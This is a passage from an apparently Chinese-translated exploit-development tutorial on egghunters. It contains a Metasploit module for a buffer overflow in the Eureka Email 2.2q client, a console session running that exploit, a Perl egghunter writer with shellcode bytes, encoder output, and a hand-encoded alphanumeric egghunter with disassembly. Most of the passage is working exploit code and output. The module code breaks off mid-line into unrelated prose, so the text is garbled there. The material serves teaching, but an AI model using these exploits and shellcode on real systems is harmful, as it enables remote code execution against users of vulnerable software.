include Msf::Exploit::Remote::TcpServer
include Msf::Exploit::Egghunter
def initialize(info = {})
super(update_info(info,
'Name' => 'Eureka Email 2.2q ERR Remote Buffer Overflow Exploit',
'Description' => %q{
This module exploits a buffer overflow in the Eureka Email 2.2q
client that is triggered through an excessively long ERR message.
},
'Author' =>
[
'Peter Van Eeckhoutte (a.k.a corelanc0d3r)'
],
'DefaultOptions' =>
{
'EXITFUNC' => 'process',
},
'Payload' =>
{
'BadChars' => "\x00\x0a\x0d\x20",
'StackAdjustment' => -3500,
'DisableNops' => true,
},
'Platform' => 'win',
'Targets' =>
[
[ 'Win XP SP3 English', { 'Ret' => 0x7E47BCAF } ], # jmp esp / user32.dll
],
'Privileged' => false,
'DefaultTarget' => 0))
register_options(
[
OptPort.new('SRVPORT', [ true, "The POP3 daemon port to listen on", 110 ]),
], self.class)
end
def on_client_connect(client)
return if ((p = regenerate_payload(client)) == nil)
# the offset to eip depends on the local ip address string length...
offsettoeip=723-datastore['SRVHOST'].length
# create the egg hunter
hunter = generate_egghunter
# egg
egg = hunter[1]
buffer = "-ERR "
buffer 程序的客户端IP，
192.168.0.122是运行metasploit的机器的IP)
把这个模块保存在exploit/windows/eureka (新建的目录)目录。
测试一下：
# # ###### ##### ## #### ##### # #### # #####
## ## # # # # # # # # # # # #
# ## # ##### # # # #### # # # # # # #
# # # # ###### # ##### # # # # #
# # # # # # # # # # # # # #
# # ###### # # # #### # ###### #### # #
=[ metasploit v3.3.4-dev [core:3.3 api:1.0]
+ -- --=[ 493 exploits - 232 auxiliary
+ -- --=[ 192 payloads - 23 encoders - 8 nops
=[ svn r8137 updated today (2010.01.15)
msf > use exploit/windows/eureka/corelan_eureka2
msf exploit(corelan_eureka2) > set payload windows/exec
payload => windows/exec
msf exploit(corelan_eureka2) > set SRVHOST 192.168.0.122
SRVHOST => 192.168.0.122
msf exploit(corelan_eureka2) > set CMD calc
CMD => calc
msf exploit(corelan_eureka2) > exploit
[*] Exploit running as background job.
msf exploit(corelan_eureka2) >
[*] Server started.
[*] [*] Sending exploit to 192.168.0.193...
[*] Offset to EIP : 710
[*] Server stopped.
连接Eureka Mail client到92.168.0.122 :
换用一个shellcode，建立一个绑定到5555端口的shell。
Badchars 和编码器
利用 Metasploit
像shellcode一样，内存中寻蛋代码也很容易遭到破坏。因为它同样也收到bad chars等因素困扰。所以当寻蛋
代码执行时发生错误，比较内存中的拷贝和原始版本的差异来找出Bad Chars不失为上上策（。前面用到的比较技术，
对寻蛋代码和shellcode都适用）。
发现寻蛋代码被破坏后该怎么办呢？
为了使寻蛋代码工作，也许要换用一种编码方式，也许要使用一个“bad char”过滤器过滤掉那些导致代码在
内存中被破坏（修改）的字符。当让两种方式都用到也不稀奇。
注意寻蛋代码使用的编码器和“Bad chars”过滤器可能完全不同于用在shellcode上的。虽然这种情况不经常发
生，但确实存在。
对寻蛋代码（或shellcode）是很简单的。把寻蛋代码写入一个文件，然后对寻蛋代码进行编码，然后把编码后
的输出作为新的寻蛋代码。至于是否要把标记也进行编码取决于那些 bad chars.不过一般情况下，不应该把对标记
编码。毕竟如果编码后标记变了，你必须把改变后的标记放在shellcode前„„这样不得不对寻蛋代码进行调试，从
而找出标记是如何变化的。
来看一个例子：这里对寻蛋代码使用字符和数字混（alphanumerical）的编码方式,标记也在被编码之列.
root@xxxxx:/pentest/exploits/trunk# cat writeegghunter.pl
#!/usr/bin/perl
# Write egghunter to file
# Peter Van Eeckhoutte
#
my $eggfile = "eggfile.bin";
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
open(FILE,">$eggfile");
print FILE $egghunter;
close(FILE);
print "Wrote ".length($egghunter)." bytes to file ".$eggfile."\n";
root@xxxxx:/pentest/exploits/trunk# perl writeegghunter.pl
Wrote 32 bytes to file eggfile.bin
root@xxxxx:/pentest/exploits/trunk# ./msfencode -e x86/alpha_upper -i eggfile.bin -t
perl
[*] x86/alpha_upper succeeded with size 132 (iteration=1)
my $buf =
"\x89\xe0\xda\xc0\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43" .
"\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58" .
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" .
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" .
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x43\x56\x4d\x51" .
"\x49\x5a\x4b\x4f\x44\x4f\x51\x52\x46\x32\x43\x5a\x44\x42" .
"\x50\x58\x48\x4d\x46\x4e\x47\x4c\x43\x35\x51\x4a\x42\x54" .
"\x4a\x4f\x4e\x58\x42\x57\x46\x50\x46\x50\x44\x34\x4c\x4b" .
"\x4b\x4a\x4e\x4f\x44\x35\x4b\x5a\x4e\x4f\x43\x45\x4b\x57" .
"\x4b\x4f\x4d\x37\x41\x41";
现在看下buf变量的输出:标记肯定在里面，但是具体在哪呢？标记究竟改变了么？这个编码后的代码是够能工
作呢。
试一下，如果不能工作别失望，继续读下去。
手工编码
如果限制太多，Metasploit不能帮完成对shellcode编码该怎么办呢？(寻蛋代码也属于shellcode
的一种,所以这里指的是各种形式的shellcode)
例如Bad Char的列表非常大，而寻蛋代码又只能由字符加数字组成，怎么办？
当然，需要进行手工编码。事实上光对寻蛋代码编码还不能完全打碎身上枷锁，真正需要的是一个能重新生成
原始的寻蛋代码的并执行的解码器。
本章的思想来源于Muts写的一个美丽的exploit。
在这个exploit有一个非常特殊的寻蛋代码。
egghunter=(
"%JMNU%521*TX-1MUU-1KUU-5QUUP\AA%J"
"MNU%521*-!UUU-!TUU-IoUmPAA%JMNU%5"
"21*-q!au-q!au-oGSePAA%JMNU%521*-D"
"A~X-D4~X-H3xTPAA%JMNU%521*-qz1E-1"
"z1E-oRHEPAA%JMNU%521*-3s1--331--^"
"TC1PAA%JMNU%521*-E1wE-E1GE-tEtFPA"
"A%JMNU%521*-R222-1111-nZJ2PAA%JMN"
"U%521*-1-wD-1-wD-8$GwP")
（这个 exploit 由完全由文字和数字构成的寻蛋代码和有限的几个特殊字符\x40\x3f\x3a\x2f 组成。所以很
可能是该漏洞只能被可打印的字符序列触发。这种情况在web服务上很常见）
这个寻蛋代码对应的汇编代码如下（这里仅显示前几行）：
25 4A4D4E55 AND EAX,554E4D4A
25 3532312A AND EAX,2A313235
54 PUSH ESP
58 POP EAX
2D 314D5555 SUB EAX,55554D31
2D 314B5555 SUB EAX,55554B31
2D 35515555 SUB EAX,55555135
50 PUSH EAX
41 INC ECX
41 INC ECX
25 4A4D4E55 AND EAX,554E4D4A
25 3532312A AND EAX,2A313235
2D 21555555 SUB EAX,55555521
2D 21545555 SUB EAX,55555421
2D 496F556D SUB EAX,6D556F49
50 PUSH EAX
41 INC ECX
41 INC ECX
25 4A4D4E55 AND EAX,554E4D4A
25 3532312A AND EAX,2A313235
2D 71216175 SUB EAX,75612171
2D 71216175 SUB EAX,75612171
2D 6F475365 SUB EAX,6553476F
喔！这和前面见到的寻蛋代码完全不一样。
现在我们分析一下。前4个指令清除EAX的值（2个逻辑与运算），然后把ESP的值压栈（这里保存着编码后的
寻蛋代码的开始地址）。接下来，这个值被弹出到 EAX 中。下面 4 条指令执行后，EAX 中保存着指向保存着寻蛋代
码的指针。
25 4A4D4E55 AND EAX,554E4D4A
25 3532312A AND EAX,2A313235
54 PUSH ESP
58 POP EAX
接下来，EAX被一系列的SUB指令改变。然后新的EAX值被压栈，ECX寄存器的值增加2.
2D 314D5555 SUB EAX,55554D31
2D 314B5555 SUB EAX,55554B31